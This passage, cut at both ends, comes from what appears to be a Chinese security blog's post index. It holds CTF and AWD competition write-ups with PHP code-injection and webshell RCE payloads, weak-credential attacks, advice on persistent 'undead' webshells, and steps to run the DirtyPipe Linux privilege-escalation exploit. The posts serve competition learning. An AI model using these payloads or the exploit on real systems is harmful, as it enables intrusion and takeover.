的分支：\n\n![](https://cdn.anyiblog.top/common/1648713517896-0c0fcddc-c4bb-4471-a581-f161b21a27b4.jpg)\n![](https://cdn.anyiblog.top/common/1648713519448-4cfdfa26-477b-4717-b8c1-a91535bd25fc.jpg)\n…\n\n![](https://cdn.anyiblog.top/common/1648713521251-ecfa3276-aec1-4e02-9726-4a466abbebb2.jpg)\n109-115行因为要与数据库进行连接的原因，前几个变量的值我们不可控，而 url 的变量是可控的，如下：\n\n![](https://cdn.anyiblog.top/common/1648713522378-af99af39-53e9-40e2-9dc0-68c693dcf35a.jpg)\nstr函数的内容再/inc/config.php中定义，看一下相应的部分：\n\n![](https://cdn.anyiblog.top/common/1648713523160-d3d07f62-64c3-4f8f-a159-56ce570c3f12.jpg)\n此处只要闭合单引号，并注释后面部分即可。\n\npayload：url=');phpinfo();//\n\n经过替换后/inc/config.php的内容被更改为：\n\n![](https://cdn.anyiblog.top/common/1648713524290-a14c8658-81d8-4e98-b1b4-ba8e5b710ec3.jpg)\n利用该漏洞后，我们只要访问/inc/config.php文件，就可以看 phpinfo(); 的内容。payload 如下:\n\n![](https://cdn.anyiblog.top/common/1648713529197-b9208019-d416-4961-9b93-f7d67d5b02a3.jpg)\n虽然提示报非法提交，尝试访问/inc/config.php查看phpinfo是否拼接成功。\n\n![](https://cdn.anyiblog.top/common/1648713532450-59903917-8ba6-4bbf-8b56-72fd9d0c2d2c.jpg)","tags":["刷题"],"categories":["刷题笔记","中职"]},{"title":"我与我的An1s_team","url":"/2022/03/09/20220309/","content":"\n# 前言\n\n随着Bugku的一篇公告下来 便诞生了这篇文章。\n\n![](http://cdn.anyiblog.top/common/1646744042034-909e3105-9ba8-44df-976b-a6f3598c8d86.png)\n\n是的 我们的战队有幸拿了奖\n\n早上火师傅提醒了我 我才知道 属于我们的一份小惊喜hhh！\n\n![](http://cdn.anyiblog.top/common/1646744106710-314ba7cb-78c0-42b0-943a-e866ccf95930.png)\n\n而我们战队排在第4名 所以奖杯我们有幸斩获！\n\n(样图)\n![](http://cdn.anyiblog.top/common/1646781612717-5d983ff7-5f42-4409-8c2b-352d462451c7.jpg)\n\n# 我的经历\n\n我创建这个战队的目前一是为了学习，二是为了拿奖杯。\n\n因为当初S1的奖杯是前三名才有机会获得，所以我当时就想：唉，那个奖杯多香啊\n\n于是，我建立了战队An1s_team，我的目标就是拿奖杯，当时是已经是S2的第7场排位赛了，\n\n我知道 想到前三自己也得有点本事 在每场比赛分数力拔头筹才行。然后我就不断参加训练赛 练习AWD 学习AWD\n\n后来，在Harry的帮助下 我有幸嫖到了SVIP 然后有了免费开靶场的机会，所以每周都会开一个训练赛打。\n\n随着AWD打着也有了经验，开始编写了属于我自己的Shell脚本，多功能，它陪伴了我很久 对我的帮助也很大，\n\n让我在每场比赛里更好的拿分，之后不断完善，脚本也变得好用、功能多、实用（虽然bug还是很多hhh）\n\n从第7场一直磨练到第25场 感触真的很大，自身进步了不少 脚本编写能力强了、AWD也会打了，可以说Bugku的靶场对我的帮助很大。\n\n陆陆续续也半年过去了 感叹时间真的很快！\n\n# 我的队友\n\n当时在排位赛和训练赛排名小有名气 就有人开始加我的战队了，\n\n说实话，第一次有人认同我真的很开心\n\n我记得第一位成员是nana，第二位是J1n9Ao ……后面还有火师傅、Ztop师傅的加入\n\n我把自己的思路、脚本分享给他们 他们也渐渐地会打AWD了\n\n说实话 挺欣慰的，我记得有一场我没打 火师傅和shoe师傅用着我的脚本杀到了第二名 哈哈哈哈 不得不说，真的有一种欣慰感！\n\n所谓人多力量大 成员多了 我们的战队就强大起来了\n\n于是我们拼搏到最后 是第四名的成绩，虽然没有到我的预期 但是我觉得我们已经很不错了 毕竟打的迟。\n\n转折就是奖杯改为前六名！hhh也算是没愧对努力吧\n\n# 想对你们说的话\n\n不论Awd中 Web也好Pwn也好 我其实不会强求你们一定要去参加并拿到好成绩\n\n我认为学习为主 能从中学到东西便是好的\n\n像你们加入我的战队 我们共同交流学习才是最终目的\n\n希望未来的某一天 你们能在安全圈子里有一定名声，然后我会在哪一天看到你们的poc 想起了这段时间。无比感动！\n\n所幸能碰到优秀的你们 才有今日的成绩\n\n想对An1s_team的各位说一声谢谢 感谢你们各自付诸努力 有了这个团队的成绩，以后我们共同加油！\n\n# 尾声\n\n有希望加入我们这个小团队的可以私聊我的QQ或者微信\n\n壮大我们的小团队 共同加油 共同学习。\n\nQQ 1395980247\nWechat Anyiii0317\n\n","tags":["简介"],"categories":["闲话"]},{"title":"DirtyPipe-Linux内核提权漏洞 CVE-2022-0847","url":"/2022/03/08/20220308/","content":"\n# 关于\n\nCVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。 CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”\n\n披露老哥原文地址：https://dirtypipe.cm4all.com/\n\n参考文章https://github.com/imfiver/CVE-2022-0847\n\n# 复现\n\n> 注意事项\n该漏洞已在 Linux 5.16.11 5.15.25 和 5.10.102 中修复。\n用uname -a 查看当前linux版本\n![](http://cdn.anyiblog.top/common/1646717540021-96f1579a-9c88-4299-8afe-c740118167f0.png)\n\n\n\n> 复现环境\n(成功)Linux Anyyy 5.10.0-kali6-amd64 #1 SMP Debian 5.10.26-1kali2 (2021-04-01) x86_64 GNU/Linux\n(失败)Linux localhost.localdomain 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux\n\n\n\n> 依赖\ngcc\n\n\n\n## 使用步骤\n    git clone https://github.com/imfiver/CVE-2022-0847.git\n    cd CVE-2022-0847\n    chmod +x Dirty-Pipe.sh\n    bash Dirty-Pipe.sh\n\n### 5.10.26版本\n\n![](http://cdn.anyiblog.top/common/1646717540021-96f1579a-9c88-4299-8afe-c740118167f0.png)\n\n![](http://cdn.anyiblog.top/common/1646717545983-e0982820-719b-4d7b-ba07-f9e6616fa943.png)\n\n成功提权 复现成功\n\n### 5.10.13版本\n\n![](http://cdn.anyiblog.top/common/1646717285465-225f3679-23b2-41cc-94d2-27d691c34ab7.png)\n\n![](http://cdn.anyiblog.top/common/1646717329362-d2d9c817-75ae-4fd8-a3c2-023c09df3b75.png)\n\n需要密码 提权失败\n\n","tags":["干货"],"categories":["CVE漏洞","0day"]},{"title":"Bugku S2收官赛AWD解析&如何打AWD?","url":"/2022/03/05/20220305/","content":"# 前言\n\n随着Bugku awd的举办 S2排位赛走向了尾声。我们的战队An1s_team是从S2的第7场比赛开始打起的，到收官赛我们的排行是第四，我个人十分满意这个成绩 虽然说我的目标是前三 但因为打的比较迟 所以这个成绩我觉得也很不错。\n\n![](http://cdn.anyiblog.top/common/1646483612418-c7b1dfb2-be58-42d3-a553-139412f82316.png)\n\n总的来说我的队友都很不错 像是火神 还有ztop师傅等他们都挺积极的 每一次的排位赛基本都有参加 也会在我们的战队群里积极交流哪里有漏洞 分享找到的参考文章我们之间进行交流学习 我觉得这样的团队就很有意义 互相学习，互相进步。\n\n这次我们在S2收官赛成绩是第三 我知道自己的水平有限 所以这个成绩我觉得不错。\n![](http://cdn.anyiblog.top/common/1646483612225-7400aa6c-6f0f-4846-a982-5eccc29ece78.png)\n\n总结就是这个赛季不错 我们下个赛季继续加油 并且我打算重新改进下目前的shell脚本 因为存在较多的问题 再接再厉 学习为主！\n\n\n# 收官赛解析\n\n已将全程的录像视频投至bilibili：https://www.bilibili.com/video/BV1La411b7hR?spm_id_from=333.999.0.0\n\n以下是总结 之后我会一一解析：\n\nWeb :\n\n存在自带的木马 assert($_GET[s]) ：\\public\\common\\images\\1.jpg.php\n\n后台存在弱口令：admin/?c=index 账号密码：admin admin123\n\ncms是5iSNS 好像cms的漏洞很少或者说是没有\n\nPwn：\n\n是一个经典的堆题 以及菜单题\n\n太菜了做不出来\n\n----\n\n网站首页：\n\n![](http://cdn.anyiblog.top/common/1646485206896-666cdd51-ef14-4473-b69b-e1c77d34da51.png)\n\n## Web漏洞：\n\n### 漏洞1：\n\n网站存在自带木马\n\n首先用filezilla将网站源码拷贝到本地(bugku是/var/www/html或/app)\n\n![](http://cdn.anyiblog.top/common/1646484572231-4db459c8-a42e-467c-a507-419da4d2b82e.png)\n\n然后使用D盾扫描源码 得到以下漏洞：\n\n![](http://cdn.anyiblog.top/common/1646484623699-f1e29384-02d0-4769-a57a-ef2d7fba6a99.png)\n\n两个级别为1的漏洞可以不用管 看严重漏洞是一个自带的木马 显然这是网站源码存在的高级别漏洞 内容是一个变种的assert马(类似eval) 是可以RCE的\n\n![](http://cdn.anyiblog.top/common/1646484869292-6cbf3f26-0a9d-4cbe-8735-d3d240842d8a.png)\n\n访问漏洞url /public/common/images/1.jpg.php?s=phpinfo()显然RCE了\n\n![](http://cdn.anyiblog.top/common/1646484921704-6de2e0c3-c442-4f5b-a775-44445b98475f.png)\n\n?s后带php函数都会实现 所以可以用eval(system(xxx))进行系统的rce 就可以获取flag了 这里我是用我自己的脚本实现的。\n\n修复建议：连接到ssh删除相应木马\n\n### 漏洞2：\n\n网站后台存在弱口令\n\n访问后台/admin/?c=index(ztop师傅找到的哈哈哈我自己找半天没找着)\n\n![](http://cdn.anyiblog.top/common/1646485114623-bd1da979-a152-4fc9-a845-97930cf36df9.png)\n\n一般用户都是admin 测试密码得出为admin123 弱口令\n\n进入后台我自己没找到有什么功能是可以进行渗透的(像文件上传、改文件)\n\n其中文件上传有一处是在页面编辑里 有一个功能是上传图片 然后会检测是否符合后缀 以及内容\n\nburpsuite测试后得到图片内容如果为空不允许上传、没有文件头不允许上传(可以加GIF89a)内容可以绕过 但是后缀改成php就会报错\n\n因为时间原因就没有过多测试 有兴趣可以自己搭一个复现\n\n修复建议：登录后台更改管理员密码 或使用数据库更改\n\n![](http://cdn.anyiblog.top/common/1646485487114-7f9aa885-be0b-42b9-af6d-fc2d417416a6.png)\n\n\n这一套CMS是5iSNS 网上查找一番就找到一个sql利用脚本 但是也利用不起来哈哈哈 漏洞应该挺少的\n\n## Pwn漏洞\n\n64位程序，保护如下：\n![](http://cdn.anyiblog.top/common/1646485935169-07699ac8-1e26-44aa-ada9-35c15126faa1.png)\n\n是一个菜单堆题 貌似是UAF漏洞 太菜了不会做 尝试在网上找exp无果hhh\n\n有一道类似的题目我拿来套用 最后也是没打通 害\n\nmain函数如下：\n\n![](http://cdn.anyiblog.top/common/1646486140524-55e434af-481a-4a7b-846e-9457b7c9ad48.png)\n\npwn堆题真的好难啊\n\n\n## 脚本利用\n\n这次脚本可以就后台弱口令和自带木马进行利用 通过requests库进行漏洞url构造实现批量利用木马 以及post内容发送实现检测后台弱口令\n\n因为后台没有验证码 所以直接可以利用，\n\n使用burpsuite拦截后台登录的包\n\n![](http://cdn.anyiblog.top/common/1646486501263-45de9baf-71f9-4b21-9cbc-29bbbf48a42a.png)\n\n参数为usermail和password 用requests中post的data={'usermail':xxx,'password'：xxx}就可以发送这个包 实现检测的效果\n\n我自己脚本跑的效果如下：\n\n![](http://cdn.anyiblog.top/common/1646486618798-a4587fe4-6127-46d9-ad6f-4357194f7cf0.png)\n\n自带木马的漏洞也可以直接用request访问实现获取flag 先构造好payload：?s=eval(system('cat /flag'))) 之后用request访问即可。\n\n最后附上一张获取flag的图片 效果没那么好了hhh\n\n![](http://cdn.anyiblog.top/common/1646486773031-998450a8-16ac-4e5c-a092-770f10912fe3.png)\n\n\n题外话：\n\n观战席看到的hhh 关于木马密码泄露这件事\n![](http://cdn.anyiblog.top/common/1646487123540-da83d3e1-e147-4e79-b2f7-bef679097eb0.png)\n\n# 如何打AWD?\n\n\n就Bugku的awd模式写一下我一般的做法\n\n以下是我的思路 仅供参考XD：\n\n首先开始前可以将token之类的写进自己的脚本 用于提交flag等 并且写一个扫描网段ip的脚本 这样的批量会大幅提升效率\n\n还有使用filezilla或者xshell等ssh连接工具进行连接服务器 将源码下载到自己电脑里(一般都是/var/www/html的网站文件 pwn附件在/home/ctf/pwn)\n\nweb利用可以使用D盾扫描看看有没有高危的漏洞 例如自带马等 如果有可以自己先访问url试一试phpinfo能不能实现\n\n能的话最好用脚本批量帮你获取flag 实在不行就手工\n\n然后网站后台也会存在漏洞 一般是弱口令admin admin或者别的 自己多试试就可以进去 后台进去后可以找下各种功能\n\n一般来说如果可以直接在后台改允许上传的后缀 再加上有文件上传的功能 那么基本都能上传木马getshell\n\n还有就是可以直接更改模板、页面等内容的 改php代码进去 再访问修改的文件url进行RCE\n\n最后有了能得到flag的一堆exp 再用bugku提供的api进行批量提交flag 这样效率就会快很多很多\n\n还有bugku的所有cms的mysql都有弱口令 就是root root 但是每个人靶机的mysql端口是不开的 也就是说远程连接不了\n\n所以如果你打的这套cms有phpmyadmin 就可以通过phpmyadmin连接mysql，那也是漏洞 只要你能连接到别人的mysql就可以用mysql语句写一句话木马（或者直接获取flag）再通过木马获取flag\n\n最后你可以去了解一下不死马 写不死马是最吃香的 比方说如果你的木马被别人删掉你就利用不了 那么你写一个不死马他是一直存在的 包括删站 因为它是一直维持权限的 删除要杀进程才能杀死 所以是一个比较麻烦的存在 因此如果你能RCE并且时间还来得及 那么建议你写一个不死马进去 再用不死马获取flag比较保险~~\n\npwn的话是最好拿分的 也是最难的\n\n如果你能就给的pwn附件在自己的靶机打通 再写一个脚本实现pwn漏洞利用结合批量获取ip和提交flag 那么分数会拿的十分的快和轻松\n\n所以pwn手很吃香呀 对了 本人战队招收pwn手噢~~只需提供exp即可 脚本我们来帮你写！哈哈哈哈\n\n----\n\n继续学习 继续努力！备战S3赛季 加油\n\n另外有学习Pwn的师傅可以私聊我进入战队一起学习噢~\n\nQQ1395980247","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"2022长安战\"疫\"WriteUp","url":"/2022/01/09/20220109/","content":"\n<span style=\"font-size: 12pt\">前言></span>\n\n<span style=\"font-size: 10pt;font-style: italic\">\"</span> <span style=\"letter-spacing: normal;text-indent: 32px;text-transform: none;font-size: 10pt;font-style: italic\">他们以\"逆行\"的姿态为我们筑起一道坚固的\"防护墙\"，他们在打一场没有硝烟的疫情战，是一条永无退路并且必胜阻击战。他们，就是这个时代的最美逆行者。</span><span style=\"font-size: 10pt;font-style: italic\">\"--致所有疫情工作者</span>\n\n2022年疫情再起 作为南方人也希望疫情能好转， 为西安同时也为天津、郑州等加油 希望他们能挺过这次难关！\n\n疫情期间网络安全意识需提升 便诞生了本次比赛。\n\n此次比赛由600多名选手参加 我们队伍也是有幸排到了第17名 师傅们都太卷了 将近30道题都要AK了 tql\n\n![](http://cdn.anyiblog.top/common/5fcab21eff6da6241a5c4abff460ba4f.png)\n\n这次难度还算比较友好，大多数题目都能做也不至于爆0，所以做的过程还是挺舒坦的。\n\n证书是前50%就能拿到的，尽管是这样师傅们也没放弃做题，这种做题的精神是提倡和支持的，比赛最重要的就是竞技精神。\n\n以下分享由我和另一位师傅HuMoLix 组成战队0x04的解题思路\n\n<span style=\"font-size: 12pt\">解题思路></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目一八卦迷宫</span></span>\n\n<span style=\"font-size: 12pt\">题目附件如下：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/681df6392af383881eddadc4a4d5cf62.png)</span>\n\n<span style=\"font-size: 12pt\">走迷宫 再把路过的格子对应的字填入即可</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/38747c3e8ec898313c161f24cdf2f6c0.png)</span>\n\n<span style=\"font-size: 12pt\">用画图画了下</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">然后对应了一下 最后flag为</span>\n\n<span style=\"font-size: 12pt\">cazy{zhan chang yang chang zhan yang he chang shan shan an zhan yi yi zhan yi an yi chang an yang}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目二no_cry_no_can</span></span>\n\n<span style=\"font-size: 12pt\">拿到题目后，我们分析题目得知，主要是由 can_encrypt(flag,key) 函数对flag进行加密</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/ebb5bc0625f2fc6de5f592a8bc8a24a3.png)</span>\n\n<span style=\"font-size: 12pt\">通过分析函数，我们可以发现，它是将加密系数 key 进行重组，实际上是将一个key变为多个key 例如 (key: \"skip\" => new_key: \"skipskipskipskip\")知道new_key的长度大于或等于flag，然后再将new_key中的单一字符串于flag中的单一字符串进行异或加密，这类似于古典密码学中的维吉尼亚加密。</span>\n\n<span style=\"font-size: 12pt\">由于我们知道flag的前五位是由 cazy{ 组成，那么我们就可以通过密文来回退 key了，因为 key的长度 小于等于 5。</span>\n\n<span style=\"font-size: 12pt\">我们可以通过list()函数来将bytes值转为ASCII数组之后进行异或操作。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/3b449eb558ad954ec1a8639c4a7e2481.png)</span>\n\n<span style=\"font-size: 12pt\">我们可以根据异或的特性 a ^ b = c ，c ^ b = a来回推我们的key</span>\n\n<span style=\"font-size: 12pt\">key = [60 ^ ord(&apos;c&apos;), 112 ^ ord(&apos;a&apos;), 72 ^ ord(&apos;z&apos;), 134 ^ ord(&apos;y&apos;), 26 ^ ord(&apos;{&apos;)]</span>\n\n<span style=\"font-size: 12pt\">然后将key通过解密函数对flag进行解密，就可以得到flag了。</span>\n\n    #!/usr/bin/python3\n    from Crypto.Util.number import *\n    def decrypt(key,flag):\n        block_len = len(flag) // len(key) + 1\n        new_key = key * block_len\n        return bytes([i^j for i,j in zip(flag,new_key)])\n\n    key = [95, 17, 50, 255, 97]\n    flag = [60, 112, 72, 134, 26, 38, 34, 109, 206, 18, 0, 112, 109, 151, 85, 49, 117, 65, 207, 12, 58, 78, 80, 207, 24, 126, 108]\n\n    print(decrypt(key,flag))\n    => b'cazy{y3_1s_a_h4nds0me_b0y!}'\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{y3_1s_a_h4nds0me_b0y!}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目三combat_slogan</span></span>\n\n<span style=\"font-size: 12pt\">题目附件如下：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/007e0a7ce728b17a1a83a8bc5b2203fe.png)</span>\n\n<span style=\"font-size: 12pt\">一个jar文件</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">用Apktool Box 打开jar</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/d1e3f8c7bbf0fb00c18eec07d408d4c4.png)</span>\n\n<span style=\"font-size: 12pt\">看Main函数：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/a2a7c73ff92e10bf7327c6d0531122f5.png)</span>\n\n<span style=\"font-size: 12pt\">大致是通过输入的字符串通过ttk类实现加减ascii码 然后要等于Jr_j11y_s1tug_g0_raq_g0_raq_pnml</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">用在线工具调试了一下程序 发现这玩意有点凯撒的感觉 然后仔细一数这不是rot13嘛。。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/050f31c4e152b7450229433c5b14aee2.png)</span>\n\n<span style=\"font-size: 12pt\">直接把字符串在线rot13转换一下</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/8ad8aaa1c88aebd7e1816151251fd0ae.png)</span>\n\n<span style=\"font-size: 12pt\">包上cazy得到flag 提交正确。</span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{ We_w11l_f1ght_t0_end_t0_end_cazy }</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目四no_can_no_bb</span></span>\n\n<span style=\"font-size: 12pt\">拿到题目，我们发现存在两个函数，一个 pad(m) 一个 encrypt(m, key)，我们主要需要分析的函数就是pad</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/ce871a946d7feba7f137e31f0a292fba.png)</span>\n\n<span style=\"font-size: 12pt\">分析pad 函数，我们发现他是将不足16位的文件补足，比16位大的文件补至32位，以此类推。</span>\n\n<span style=\"font-size: 12pt\">而且可以看到key 的范围并不大，仅仅只有1 - 1<<20 (1048576)，所以这道题目最理想的解题方式就是爆破key，因为AES的ECB模式并不需要考虑iv（偏移量）。</span>\n\n    #!/usr/bin/python3\n    from Crypto.Util.number import *\n    from Crypto.Cipher import AES\n    def pad(m):\n        tmp = 16-(len(m)%16)\n        return m + bytes([tmp for _ in range(tmp)])\n\n    for i in range(1,1<<20):\n        cipher = b'\\x9d\\x18K\\x84n\\xb8b'\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c'\n        key = pad(long_to_bytes(i))\n        aes = AES.new(key,AES.MODE_ECB)\n        if aes.decrypt(cipher)[:5] == b'cazy{':\n            print(aes.decrypt(cipher))\n        else:\n            pass\n    =>b'cazy{n0_c4n,bb?n0p3!}\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b'\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{n0_c4n,bb?n0p3!}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目五西安加油</span></span>\n\n<span style=\"font-size: 12pt\">打开流量包</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/367a49bb906f47b14dcba0b380d9d354.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">追踪TCP流 发现一段base64</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/641fd27b60ff2af43052516f10442e28.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">Save提取至txt文本 然后再把无关字符去掉 最后得到：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/2bbe11d9f6a9e32c3fe8c478d23b9bf0.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">用python解密一下</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/4ec88875b2bc261e868693f59ea7c855.png)</span>\n\n<span style=\"font-size: 12pt\"> </span>\n\n<span style=\"font-size: 12pt\">得到一堆二进制文件 再写入文件</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/f6a61d3d11f5ce3b6add229587bb4fd9.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">Winhex分析一下 发现是一个压缩包</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/74ecf6b030158d1e6773368f89a34c5e.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">改后缀。解压后得到了一堆图片，很明显是拼图题。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/02b7cd292b01c2ff3257b53dc6d244e8.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">因为没有装gaps所以只好ps手拼，为了好拼百度搜索查找一番后找到了原图：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/92bbcc9e061875e226c22a04d794e61a.png)</span>\n\n<span style=\"font-size: 12pt\">拼了好久一段时间 最后总算是拼完了</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/ab6f7bfd926b8663ba911e8aa60febe7.png)</span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{make_XiAn_great_Again}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">附gaps做法：</span>\n\n<span style=\"font-size: 12pt\">先用montage将小图结合到大图里去</span>\n\n<span style=\"font-size: 12pt;font-family: unset\">magick montage *.png -geometry +0+0 flag.jpg</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/f1bc333565ab8a1a695041cba5912d4e.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt;font-family: unset\">将得到的大图 用gaps自动拼接</span>\n\n<span style=\"font-size: 16px;letter-spacing: normal;text-indent: 0px;text-transform: none;, sans-serif, SimHei, SimSun\">gaps --image=flag.jpg --generations=40 --population=120 --size=100 --save</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/640583a7ba2b69175c7a4d334f2a66af.png)</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/e6c54e9aa48d0c8c877bd8c3a687e5de.png)</span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目六朴实无华的取证</span></span>\n\n<span style=\"font-size: 12pt\">这是一道为数不多的内存取证题目，题目给了我们一个xp_sp3.raw内存文件。我们就用volatility对其进行分析。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/3e86f4a4295d7eb0a9b90212a8eea71b.png)</span>\n\n<span style=\"font-size: 12pt\">查看系统基本信息之后，我们可以确定他的系统版本信息为WinXPSP2x86。根据内存取证的做题手法，对内存中正在运行的进程列出进行分析。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/67fd4d2d372677709d8d374ef327e4bb.png)</span>\n\n<span style=\"font-size: 12pt\">我们发现内存中运行着notepad.exe。我们就用 notepad 插件对notepad中的内容进行提取。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/40872828e21bdab52ca00f636bdaf3ab.png)</span>\n\n<span style=\"font-size: 12pt\">发现记事本中存在信息 20211209(encrypt)，之后我们对系统中可能存在的有关答案的文件进行列出并提取。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/647999130fa70121dbb9ded1f6478add.png)</span>\n\n<span style=\"font-size: 12pt\">我们可以发现存在flag.zip flag.png。将文件提取出来之后，发现压缩包需要解压密码，那么我们将刚才从记事本中得到的密码对其进行解压。然后我们得到了一个类似于加密的记事本内容。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/c21596cfe19e30b5625bf41f46a961c3.png)</span>\n\n<span style=\"font-size: 12pt\">然后得到了一张png图片，实际上是BMP图片。图片中告诉了我们一个大概的FLAG</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/150e6ca8c79320b2098a2bd0bb780880.png)</span>\n\n<span style=\"font-size: 12pt\">然后根据加密脚本，对其进行解密，加密脚本的大致原理应该是一个凯撒加密。并且偏移量为3位。我们对其进行大概的解密后发现，FLAG并不是正确的。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/0162ecb7515346a72fc23c3e3569d4a0.png)</span>\n\n<span style=\"font-size: 12pt\">我们知道，在凯撒加密中，特殊字符和数字并不能被正确的加密或者解密，所以根据加密脚本，我们将数字的ACSII码向后位移32位之后，并且根据做题习惯将？改为_，便可以得到正确的flag</span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目七RCE_No_Para</span></span>\n\n<span style=\"font-size: 12pt\">这道题，就是一道需要通过PHP各种参数进行Bypass绕过的题目。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/67d78e10e7407b026028c22f1ac7eb7e.png)</span>\n\n<span style=\"font-size: 12pt\">分析题目之后，发现题目通过正则表达式，将匹配到的文件替换为空，并且对 session</span>\n\n<span style=\"font-size: 12pt\">end next header dir 字样进行检测，如果检测到了便返回 \"Hacker!\"</span>\n\n<span style=\"font-size: 12pt\">既然会对code中函数进行检测，那么我们就用别的参数进行传参，并且对code进行注释。</span>\n\n<span style=\"font-size: 12pt\">构造Payload来获取目录下的文件:</span>\n\n<span style=\"font-size: 12pt\">?1551=system(%27cat%20flag.php%27);//&code=eval(implode(reset(get_defined_vars())));</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/1e9ca09f96d9a6225c7664c5c1905d3e.png)</span>\n\n<span style=\"font-size: 12pt\">构造Payload来获得flag：</span>\n\n<span style=\"font-size: 12pt\">?1551=system(%27cat%20flag.php%27);//&code=eval(implode(reset(get_defined_vars())));</span>\n\n<span style=\"font-size: 12pt\">在F12中得到flag值。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/8ca1178d16305918fd8dfff23bc8c6de.png)</span>\n\n<span style=\"font-size: 12pt\">FLAG值：flag{94e3bd90859dba7c2cb9f47865947370}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目八flask</span></span>\n\n<span style=\"font-size: 12pt\">进入题目，我们打开F12打开发现前端存在判断，仔细观察函数requests已经if语句格式，结合题目 